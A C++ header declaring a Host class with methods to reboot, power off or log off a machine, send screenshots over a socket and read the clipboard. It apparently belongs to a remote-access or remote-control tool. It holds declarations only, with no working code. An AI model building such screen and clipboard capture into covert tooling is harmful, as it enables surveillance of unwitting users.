#ifndef __HOST_H__
#define __HOST_H__

#include <iostream>

#include "common.h"
#include "privileges.h"

class Host{

public:
    Host(){}
    ~Host(){}
    bool reboot();
    bool powerOff();
    bool logonOff();
    void screenShot(SOCKET s);
    std::string getClipBoard();
private:
    Privileges priv;
    size_t packFile(BYTE *data, BYTE *fileHeader, BYTE *fileInfo, BYTE *dataBits, DWORD fheader, DWORD finfo, DWORD bits);
};

#endif // __HOST_H__
